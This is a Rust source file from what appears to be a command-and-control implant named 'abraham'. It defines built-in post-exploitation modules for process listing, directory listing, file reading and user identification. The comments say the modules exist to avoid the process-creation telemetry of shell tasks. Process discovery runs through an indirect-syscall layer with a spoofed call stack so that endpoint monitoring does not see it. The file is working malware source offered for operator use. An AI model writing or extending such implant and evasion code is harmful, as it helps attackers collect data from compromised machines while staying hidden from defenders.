//! In-process task modules (ABR-T011): built-in collection primitives
//! executed inside the implant on the session thread — no child
//! processes, no new threads. Routine post-exploitation needs (process
//! discovery, file listing, file read, self-identification) no longer
//! require `cmd.exe /C` shell tasks, whose process-creation telemetry is
//! the noisiest artifact of a classic C2. NT-based modules dispatch
//! through the indirect-syscall layer (ABR-T005/T009/T010), so even the
//! collection syscalls run with a spoofed call stack.

use crate::evasion::syscalls;

/// Module names accepted by [`run`] — also the operator help line.
pub const NAMES: &str = "ps, ls <path>, cat <path>, whoami";

/// Runs a built-in module by name. `args` semantics are per module.
pub fn run(name: &str, args: &str) -> Result<Vec<u8>, String> {
    match name.trim() {
        "ps" => processes(),
        "ls" => listing(args.trim()),
        "cat" => read_file(args.trim()),
        "whoami" => whoami(),
        other => Err(format!("unknown module '{other}' (available: {NAMES})")),
    }
}

const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
const SYSTEM_PROCESS_INFORMATION: usize = 5;

/// Process discovery through spoofed indirect
/// `NtQuerySystemInformation(SystemProcessInformation)` — TSV output:
/// pid, ppid, threads, handles, name. The syscall returns the same data
/// `tasklist` would show, with none of the process/CONHOST telemetry.
fn processes() -> Result<Vec<u8>, String> {
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or_else(|| "NtQuerySystemInformation unresolved".to_string())?;
    let mut buffer = vec![0u8; 0x8000];
    let rows = loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION, // class is the first argument
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        // NTSTATUS convention: the kernel returns the 32-bit code; treat
        // it as u32 before severity tests.
        let nt = status as u32 as i32;
        if nt >= 0 {
            break parse_processes(&buffer);
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!(
                "NtQuerySystemInformation failed: {:#010x}",
                nt as u32
            ));
        }
        buffer.resize(buffer.len() * 2, 0);
    };
    let mut out = String::from("pid\tppid\tthreads\thandles\tname\n");
    for row in rows {
        out.push_str(&row);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

fn parse_processes(buffer: &[u8]) -> Vec<String> {
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut rows = Vec::new();
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let threads = read_u32(offset + 4).unwrap_or(0);
        // SYSTEM_PROCESS_INFORMATION (x64): ImageName UNICODE_STRING at
        // +0x38 (Length) / +0x40 (Buffer), UniqueProcessId +0x50,
        // InheritedFromUniqueProcessId +0x58, HandleCount +0x60.
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let pid = read_usize(offset + 0x50).unwrap_or(0);
        let ppid = read_usize(offset + 0x58).unwrap_or(0);
        let handles = read_u32(offset + 0x60).unwrap_or(0);
        let name = if name_len > 0 && name_ptr != 0 {
            read_utf16z(name_ptr, name_len)
        } else {
            "System".to_string()
        };
        rows.push(format!("{pid}\t{ppid}\t{threads}\t{handles}\t{name}"));
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    rows
}

/// Reads a null-terminated UTF-16 string from the system-information
/// buffer (the UNICODE_STRING lengths include the terminator).
fn read_utf16z(ptr: usize, byte_len: usize) -> String {
    let mut units = Vec::with_capacity(byte_len / 2);
    for step in 0..byte_len / 2 {
        let unit = unsafe {
            u16::from_le_bytes([
                std::ptr::read_volatile((ptr + step * 2) as *const u8),
                std::ptr::read_volatile((ptr + step * 2 + 1) as *const u8),
            ])
        };
        if unit == 0 {
            break;
        }
        units.push(unit);
    }
    String::from_utf16_lossy(&units)
}

/// Directory listing — TSV: type, size, name.
fn listing(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("usage: ls <path>".into());
    }
    let dir = std::fs::read_dir(path).map_err(|e| format!("{path}: {e}"))?;
    let mut rows: Vec<(bool, u64, String)> = Vec::new();
    for entry in dir {
        let entry = entry.map_err(|e| format!("{path}: {e}"))?;
        let meta = entry.metadata().map_err(|e| format!("{path}: {e}"))?;
        rows.push((
            meta.is_dir(),
            meta.len(),
            entry.file_name().to_string_lossy().into_owned(),
        ));
    }
    rows.sort_by(|a, b| a.2.cmp(&b.2));
    let mut out = String::from("type\tsize\tname\n");
    for (is_dir, len, name) in rows {
        out.push_str(if is_dir { "d\t" } else { "f\t" });
        out.push_str(&len.to_string());
        out.push('\t');
        out.push_str(&name);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

/// Small-file read, capped so a fat target cannot balloon the result
/// into an endless chunk transfer (use the DOWNLOAD task for that).
const CAT_CAP: usize = 512 * 1024;

fn read_file(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("usage: cat <path>".into());
    }
    let mut data = std::fs::read(path).map_err(|e| format!("{path}: {e}"))?;
    if data.len() > CAT_CAP {
        data.truncate(CAT_CAP);
        data.extend_from_slice(b"\n[abraham] truncated at 512 KiB - use download\n");
    }
    Ok(data)
}

/// Self-identification from the process environment block — no API
/// calls at all.
fn whoami() -> Result<Vec<u8>, String> {
    let env = |key: &str| std::env::var(key).unwrap_or_default();
    Ok(format!(
        "{}\\{}@{}\npid={}\n",
        env("USERDOMAIN"),
        env("USERNAME"),
        env("COMPUTERNAME"),
        std::process::id()
    )
    .into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ps_lists_own_process() {
        // Runs NtQuerySystemInformation end-to-end through the spoofed
        // dispatcher — a real data-returning syscall on the synthetic
        // stack, not just a yield.
        let out = processes().expect("ps module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("pid\tppid\tthreads\thandles\tname\n"));
        let own = std::process::id().to_string();
        assert!(
            text.lines()
                .any(|line| line.starts_with(&own) && line.contains("abraham_implant")),
            "own process row missing"
        );
    }

    #[test]
    fn ls_and_cat_roundtrip() {
        let dir = std::env::temp_dir().join("abraham_module_test");
        std::fs::create_dir_all(&dir).expect("mkdir");
        std::fs::write(dir.join("note.txt"), b"hello modules").expect("write");
        let path = dir.to_str().expect("utf8 path");
        let listing = listing(path).expect("ls module");
        assert!(String::from_utf8_lossy(&listing).contains("note.txt"));
        let data = read_file(&format!("{path}\\note.txt")).expect("cat module");
        assert_eq!(data, b"hello modules");
    }

    #[test]
    fn unknown_module_lists_available() {
        let err = run("definitely-not", "").unwrap_err();
        assert!(
            err.contains("ps"),
            "error should name the available modules: {err}"
        );
    }

    #[test]
    fn whoami_mentions_own_pid() {
        let out = whoami().expect("whoami module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains(&format!("pid={}", std::process::id())));
    }
}
